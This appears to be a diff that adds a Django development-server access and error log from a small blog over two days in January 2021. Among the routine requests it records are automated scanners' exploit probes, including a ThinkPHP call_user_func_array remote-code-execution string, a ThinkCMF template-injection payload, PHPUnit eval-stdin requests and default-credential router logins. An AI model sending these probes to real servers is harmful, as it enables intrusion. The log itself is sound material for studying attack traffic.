+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[21/Jan/2021 07:22:31] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 07:34:32] "GET / HTTP/1.1" 200 2027
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[21/Jan/2021 07:46:45] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2366
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[21/Jan/2021 07:46:45] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 2365
+Not Found: /api/jsonws/invoke
+[21/Jan/2021 07:46:46] "POST /api/jsonws/invoke HTTP/1.1" 404 2267
+[21/Jan/2021 07:46:46] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2027
+Not Found: /solr/admin/info/system
+[21/Jan/2021 07:46:46] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 2289
+Not Found: /wp-content/plugins/wp-file-manager/readme.txt
+[21/Jan/2021 07:46:46] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 2350
+Not Found: /index.php
+[21/Jan/2021 07:46:47] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 2361
+Not Found: /console/
+[21/Jan/2021 07:46:47] "GET /console/ HTTP/1.1" 404 2239
+[21/Jan/2021 07:46:47] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2027
+Not Found: /Autodiscover/Autodiscover.xml
+[21/Jan/2021 07:46:47] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 2303
+Not Found: /manager/html/
+[21/Jan/2021 07:59:19] "GET /manager/html/ HTTP/1.1" 404 2254
+[21/Jan/2021 08:29:23] "HEAD / HTTP/1.0" 200 2027
+Not Found: /HNAP1/
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 183, in finish_response
+    self.close()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 113, in close
+    self.get_stdin()._read_limited()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/wsgi.py", line 28, in _read_limited
+    result = self.stream.read(size)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[21/Jan/2021 09:20:26] "HEAD / HTTP/1.0" 200 2027
+[21/Jan/2021 10:15:26] "GET / HTTP/1.1" 200 2027
+Not Found: /config/getuser
+[21/Jan/2021 10:46:08] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[21/Jan/2021 11:37:59] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[21/Jan/2021 12:21:39] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 12:21:39] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 12:21:39] "GET /manager/html HTTP/1.0" 404 2247
+Not Found: /boaform/admin/formLogin
+[21/Jan/2021 13:14:34] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 2315
+[21/Jan/2021 14:31:02] "GET / HTTP/1.1" 200 2027
+Not Found: /0bef
+[21/Jan/2021 15:10:35] "GET /0bef HTTP/1.0" 404 2223
+Not Found: /config/getuser
+[21/Jan/2021 15:15:29] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[21/Jan/2021 16:01:16] "GET / HTTP/1.1" 200 2027
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[21/Jan/2021 16:03:20] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 34326)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[21/Jan/2021 16:30:06] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:06] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[21/Jan/2021 16:30:06] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[21/Jan/2021 16:30:07] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:07] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:08] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:08] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:08] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:09] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:09] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:09] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:10] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:10] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:11] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:11] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[21/Jan/2021 16:30:11] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[21/Jan/2021 17:07:11] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 17:07:11] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:12] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[21/Jan/2021 17:07:12] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[21/Jan/2021 17:07:13] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:13] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:13] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:14] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:14] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:14] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:15] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:15] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:16] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:16] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:16] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:17] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[21/Jan/2021 17:07:17] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[21/Jan/2021 18:00:09] "HEAD / HTTP/1.0" 200 2027
+[21/Jan/2021 18:04:18] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:09:19] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:09:19] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:19] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 404 2292
+Not Found: /xmlrpc.php
+[21/Jan/2021 18:09:20] "GET /xmlrpc.php?rsd HTTP/1.1" 404 2245
+[21/Jan/2021 18:09:20] "GET / HTTP/1.1" 200 2027
+Not Found: /blog/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:21] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /web/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:21] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /wordpress/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:21] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2322
+Not Found: /website/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:22] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2316
+Not Found: /wp/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:22] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2301
+Not Found: /news/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:23] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2020/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:23] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /2019/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:23] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /shop/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:24] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp1/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:24] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /test/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:25] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /wp2/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:25] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /site/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:25] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+Not Found: /cms/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:26] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2304
+Not Found: /sito/wp-includes/wlwmanifest.xml
+[21/Jan/2021 18:09:26] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 2307
+[21/Jan/2021 18:13:55] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:13:56] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[21/Jan/2021 18:13:56] "GET /static/css/blog_base_total.css HTTP/1.1" 304 0
+[21/Jan/2021 18:13:56] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[21/Jan/2021 18:13:56] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[21/Jan/2021 18:13:58] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:13:58] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:13:59] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:14:00] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:14:01] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:14:02] "GET / HTTP/1.1" 200 2027
+[21/Jan/2021 18:17:41] "GET /auth/signup HTTP/1.1" 200 5517
+[21/Jan/2021 18:17:41] "GET /static/css/blog_signup.css HTTP/1.1" 304 0
+[21/Jan/2021 18:17:43] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[21/Jan/2021 19:06:05] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 19:06:06] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 19:06:06] "GET /manager/html HTTP/1.0" 404 2247
+[21/Jan/2021 19:56:30] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[21/Jan/2021 20:14:25] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 20:14:25] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 20:14:25] "GET /manager/html HTTP/1.0" 404 2247
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.37', 58192)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[21/Jan/2021 20:17:40] "GET / HTTP/1.1" 200 2027
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.37', 56926)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[21/Jan/2021 20:17:40] "GET / HTTP/1.1" 200 2027
+Not Found: /robots.txt
+[21/Jan/2021 20:33:48] "GET /robots.txt HTTP/1.1" 404 2239
+Not Found: /humans.txt
+[21/Jan/2021 20:33:49] "GET /humans.txt HTTP/1.1" 404 2239
+Not Found: /ads.txt
+[21/Jan/2021 20:33:49] "GET /ads.txt HTTP/1.1" 404 2230
+[21/Jan/2021 20:33:50] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[21/Jan/2021 20:35:04] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 20:35:04] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 20:35:05] "GET /manager/html HTTP/1.0" 404 2247
+[21/Jan/2021 21:55:00] "GET / HTTP/1.1" 200 2027
+----------------------------------------
+Exception happened during processing of request from ('172.93.102.236', 54106)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /robots.txt
+[21/Jan/2021 22:05:09] "HEAD /robots.txt HTTP/1.0" 404 2242
+[21/Jan/2021 22:23:29] "GET / HTTP/1.1" 200 2027
+Not Found: /ip.ws.126.net:443
+[21/Jan/2021 22:23:34] "CONNECT ip.ws.126.net:443 HTTP/1.1" 404 1670
+Not Found: /login
+[21/Jan/2021 22:47:51] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[21/Jan/2021 22:47:52] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[21/Jan/2021 22:47:52] "GET /manager/html HTTP/1.0" 404 2247
+[21/Jan/2021 23:21:09] "HEAD / HTTP/1.0" 200 2027
+Not Found: /http:/example.com/
+[21/Jan/2021 23:23:19] "GET http://example.com/ HTTP/1.1" 404 1665
+[22/Jan/2021 00:24:41] "HEAD / HTTP/1.0" 200 2027
+Not Found: /login
+[22/Jan/2021 01:12:44] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[22/Jan/2021 01:12:44] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[22/Jan/2021 01:12:45] "GET /manager/html HTTP/1.0" 404 2247
+[22/Jan/2021 01:19:12] "GET / HTTP/1.1" 200 2027
+Not Found: /login
+[22/Jan/2021 01:28:35] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[22/Jan/2021 01:28:35] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[22/Jan/2021 01:28:36] "GET /manager/html HTTP/1.0" 404 2247
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/Jan/2021 01:39:00] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 54895)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /wp-login.php
+[22/Jan/2021 02:13:57] "GET /wp-login.php HTTP/1.1" 404 2245
+Not Found: /wp-login.php
+[22/Jan/2021 02:13:58] "GET /wp-login.php HTTP/1.1" 404 2245
+[22/Jan/2021 02:15:34] "GET / HTTP/1.1" 200 2027
+[22/Jan/2021 02:30:21] "GET / HTTP/1.1" 200 2027
+[22/Jan/2021 02:30:21] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[22/Jan/2021 02:30:21] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[22/Jan/2021 02:30:21] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1053
+[22/Jan/2021 02:30:21] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[22/Jan/2021 02:30:22] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[22/Jan/2021 02:30:24] "GET / HTTP/1.1" 200 2027
+[22/Jan/2021 02:30:26] "GET /auth/login HTTP/1.1" 200 2747
+[22/Jan/2021 02:30:26] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[22/Jan/2021 02:30:31] "POST /auth/login HTTP/1.1" 302 0
+[22/Jan/2021 02:30:31] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:33] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:36] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:37] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:38] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:39] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:40] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 02:30:41] "GET /auth/logout HTTP/1.1" 302 0
+[22/Jan/2021 02:30:41] "GET /auth/login HTTP/1.1" 200 2747
+[22/Jan/2021 02:30:43] "GET /auth/signup HTTP/1.1" 200 5517
+[22/Jan/2021 02:30:43] "GET /static/css/blog_signup.css HTTP/1.1" 200 1688
+Not Found: /HNAP1/
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 183, in finish_response
+    self.close()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 113, in close
+    self.get_stdin()._read_limited()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/wsgi.py", line 28, in _read_limited
+    result = self.stream.read(size)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Not Found: /boaform/admin/formLogin
+[22/Jan/2021 02:48:27] "POST /boaform/admin/formLogin HTTP/1.1" 404 2285
+Not Found: /login
+[22/Jan/2021 02:50:43] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[22/Jan/2021 02:50:43] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[22/Jan/2021 02:50:43] "GET /manager/html HTTP/1.0" 404 2247
+[22/Jan/2021 03:14:59] "GET / HTTP/1.1" 200 2027
+[22/Jan/2021 03:20:05] "GET / HTTP/1.1" 200 2027
+Not Found: /wp-login.php
+[22/Jan/2021 03:28:31] "GET /wp-login.php HTTP/1.1" 404 2247
+[22/Jan/2021 03:30:14] "GET / HTTP/1.1" 200 2027
+[22/Jan/2021 03:34:45] "GET / HTTP/1.1" 200 2027
+[22/Jan/2021 03:34:45] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[22/Jan/2021 03:34:45] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[22/Jan/2021 03:34:45] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[22/Jan/2021 03:34:48] "GET /auth/login HTTP/1.1" 200 2747
+[22/Jan/2021 03:34:48] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[22/Jan/2021 03:34:57] "GET /admin HTTP/1.1" 301 0
+[22/Jan/2021 03:34:57] "GET /admin/ HTTP/1.1" 302 0
+[22/Jan/2021 03:34:57] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+[22/Jan/2021 03:34:57] "GET /static/admin/css/base.css HTTP/1.1" 200 16307
+[22/Jan/2021 03:34:57] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 1789
+[22/Jan/2021 03:34:57] "GET /static/admin/css/login.css HTTP/1.1" 200 1185
+[22/Jan/2021 03:34:58] "GET /admin/ HTTP/1.1" 302 0
+[22/Jan/2021 03:34:58] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /favicon.ico
+[22/Jan/2021 03:34:58] "GET /favicon.ico HTTP/1.1" 404 2244
+[22/Jan/2021 03:35:00] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[22/Jan/2021 03:35:00] "GET /admin/ HTTP/1.1" 200 5170
+[22/Jan/2021 03:35:00] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[22/Jan/2021 03:35:00] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[22/Jan/2021 03:35:00] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[22/Jan/2021 03:35:02] "GET /admin/accounts/account/ HTTP/1.1" 200 6502
+[22/Jan/2021 03:35:02] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6284
+[22/Jan/2021 03:35:02] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[22/Jan/2021 03:35:02] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[22/Jan/2021 03:35:02] "GET /static/admin/js/core.js HTTP/1.1" 200 5418
+[22/Jan/2021 03:35:02] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 6078
+[22/Jan/2021 03:35:02] "GET /static/admin/js/actions.js HTTP/1.1" 200 6783
+[22/Jan/2021 03:35:02] "GET /static/admin/js/urlify.js HTTP/1.1" 200 8632
+[22/Jan/2021 03:35:02] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 287630
+[22/Jan/2021 03:35:02] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[22/Jan/2021 03:35:04] "GET /admin/accounts/account/8/change/ HTTP/1.1" 200 20284
+[22/Jan/2021 03:35:04] "GET /static/admin/css/forms.css HTTP/1.1" 200 8399
+[22/Jan/2021 03:35:04] "GET /static/admin/js/calendar.js HTTP/1.1" 200 7788
+[22/Jan/2021 03:35:04] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[22/Jan/2021 03:35:04] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19750
+[22/Jan/2021 03:35:04] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10592
+[22/Jan/2021 03:35:04] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[22/Jan/2021 03:35:04] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[22/Jan/2021 03:35:04] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[22/Jan/2021 03:35:04] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 200 677
+[22/Jan/2021 03:35:11] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 03:38:25] "GET / HTTP/1.1" 200 2026
+[22/Jan/2021 03:38:25] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[22/Jan/2021 03:38:59] "GET /auth/logout HTTP/1.1" 302 0
+[22/Jan/2021 03:38:59] "GET /auth/login HTTP/1.1" 200 2747
+/root/myblog/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+January 18, 2021 - 20:41:40
+Django version 3.1, using settings 'myblog.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/board/models.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+January 22, 2021 - 03:41:05
+Django version 3.1, using settings 'myblog.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/board/models.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+January 22, 2021 - 03:45:32
+Django version 3.1, using settings 'myblog.settings'
+Starting development server at http://0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+[22/Jan/2021 04:18:10] "GET /admin/ HTTP/1.1" 302 0
+[22/Jan/2021 04:18:10] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2214
+Not Found: /favicon.ico
+[22/Jan/2021 04:18:11] "GET /favicon.ico HTTP/1.1" 404 2244
+[22/Jan/2021 04:18:13] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
